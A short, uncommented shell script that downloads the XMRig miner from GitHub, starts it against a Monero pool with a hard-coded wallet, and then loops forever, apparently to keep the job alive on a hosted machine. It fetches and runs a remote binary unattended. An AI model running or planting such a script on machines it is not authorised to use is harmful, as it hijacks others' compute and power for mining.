#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-linux-x64.tar.gz
tar xf xmrig-6.13.1-linux-x64.tar.gz
./xmrig -o sg.minexmr.com:443 -u 8BNHP2bff8fPJKT42CEaChNME34xiV2msS9iigEtRRSeRDDnWWjF8L62cYWvcMDzvX3TyuYPvNwxJS2G1Ckd4qNaHxd4RHb -k --tls --rig-id GLB
while [ 1 ]; do
sleep 3
done
sleep 999
